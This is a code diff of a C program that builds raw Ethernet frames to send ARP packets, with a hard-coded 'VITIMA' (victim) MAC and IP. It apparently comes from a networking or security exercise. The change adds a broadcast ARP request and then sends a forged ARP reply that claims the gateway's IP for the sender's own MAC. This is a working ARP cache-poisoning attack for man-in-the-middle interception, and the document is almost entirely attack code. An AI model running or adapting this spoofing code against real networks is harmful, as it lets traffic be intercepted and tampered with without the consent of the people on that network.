@@ -17,12 +17,12 @@
 #include <net/if.h>
 #include <netinet/ether.h>
 
-#define VITIMA_MAC0 0x40 //0xff //0x4c
-#define VITIMA_MAC1 0xf0 //0xff //0xed
-#define VITIMA_MAC2 0x2f //0xff //0xde
-#define VITIMA_MAC3 0x7f //0xff //0x9f
-#define VITIMA_MAC4 0x55 //0xff //0xa2
-#define VITIMA_MAC5 0xbf //0xff //0xcd
+#define VITIMA_MAC0 0x40 //0x4c
+#define VITIMA_MAC1 0xf0 //0xed
+#define VITIMA_MAC2 0x2f //0xde
+#define VITIMA_MAC3 0x7f //0x9f
+#define VITIMA_MAC4 0x55 //0xa2
+#define VITIMA_MAC5 0xbf //0xcd
 
 //ROUTER <--> sendRawEth.c <--> DEST
 #define GATEWAY_IP0 192
@@ -94,7 +94,7 @@ void fill_arp(struct arp_packet *pkt, int operation, const uint8_t *sender_mac,
 }
 
 void print_arp(struct arp_packet *pkt) {
-  printf("ARP - hw_type       %x\n", pkt->hw_type);
+  printf("\nARP - hw_type       %x\n", pkt->hw_type);
   printf("ARP - prot_type     %x\n", pkt->prot_type);
   printf("ARP - hlen          %x\n", pkt->hlen);
   printf("ARP - dlen          %x\n", pkt->dlen);
@@ -135,7 +135,7 @@ int main(int argc, char *argv[])
 	char ifName[IFNAMSIZ];
   uint8_t sender_ip[4]  = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
   uint8_t target_ip[4]  = {VITIMA_IP0, VITIMA_IP1, VITIMA_IP2, VITIMA_IP3};
-  uint8_t target_mac[6] = {VITIMA_MAC0,VITIMA_MAC1,VITIMA_MAC2,VITIMA_MAC3,VITIMA_MAC4,VITIMA_MAC5};
+  uint8_t target_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}; //Initialize with broadcast for the firs request
 
 	/* Get interface name */
 	if (argc > 1)
@@ -168,33 +168,59 @@ int main(int argc, char *argv[])
 	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
 	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
 	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
-	eh->ether_dhost[0] = VITIMA_MAC0;
-	eh->ether_dhost[1] = VITIMA_MAC1;
-	eh->ether_dhost[2] = VITIMA_MAC2;
-	eh->ether_dhost[3] = VITIMA_MAC3;
-	eh->ether_dhost[4] = VITIMA_MAC4;
-	eh->ether_dhost[5] = VITIMA_MAC5;
+	eh->ether_dhost[0] = 0xff;
+	eh->ether_dhost[1] = 0xff;
+	eh->ether_dhost[2] = 0xff;
+	eh->ether_dhost[3] = 0xff;
+	eh->ether_dhost[4] = 0xff;
+	eh->ether_dhost[5] = 0xff;
 	/* Ethertype field */
   eh->ether_type = htons(ETH_P_ARP);
 	tx_len += sizeof(struct ether_header);
-
-  fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
-  tx_len += sizeof(struct arp_packet);
-
   /* Index of the network device */
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	/* Address length*/
 	socket_address.sll_halen = ETH_ALEN;
 	/* Destination MAC */
+	socket_address.sll_addr[0] = 0xff;
+	socket_address.sll_addr[1] = 0xff;
+	socket_address.sll_addr[2] = 0xff;
+	socket_address.sll_addr[3] = 0xff;
+	socket_address.sll_addr[4] = 0xff;
+	socket_address.sll_addr[5] = 0xff;
+
+  tx_len += sizeof(struct arp_packet);
+
+  /* Sending Request first */
+  fill_arp(arp_payload,1,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
+  print_arp(arp_payload);
+  if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+	    printf("Send failed\n");
+
+  sleep(1);
+
+  /* Sending the reply to VITIMA*/
+  target_mac[0] = VITIMA_MAC0;
+  target_mac[1] = VITIMA_MAC1;
+  target_mac[2] = VITIMA_MAC2;
+  target_mac[3] = VITIMA_MAC3;
+  target_mac[4] = VITIMA_MAC4;
+  target_mac[5] = VITIMA_MAC5;
+  /* Destination MAC */
+  eh->ether_dhost[0] = VITIMA_MAC0;
+	eh->ether_dhost[1] = VITIMA_MAC1;
+	eh->ether_dhost[2] = VITIMA_MAC2;
+	eh->ether_dhost[3] = VITIMA_MAC3;
+	eh->ether_dhost[4] = VITIMA_MAC4;
+	eh->ether_dhost[5] = VITIMA_MAC5;
 	socket_address.sll_addr[0] = VITIMA_MAC0;
 	socket_address.sll_addr[1] = VITIMA_MAC1;
 	socket_address.sll_addr[2] = VITIMA_MAC2;
 	socket_address.sll_addr[3] = VITIMA_MAC3;
 	socket_address.sll_addr[4] = VITIMA_MAC4;
 	socket_address.sll_addr[5] = VITIMA_MAC5;
-
+  fill_arp(arp_payload,2,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),sender_ip,target_mac,target_ip);
   print_arp(arp_payload);
-	/* Send packet */
   if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 	    printf("Send failed\n");
 
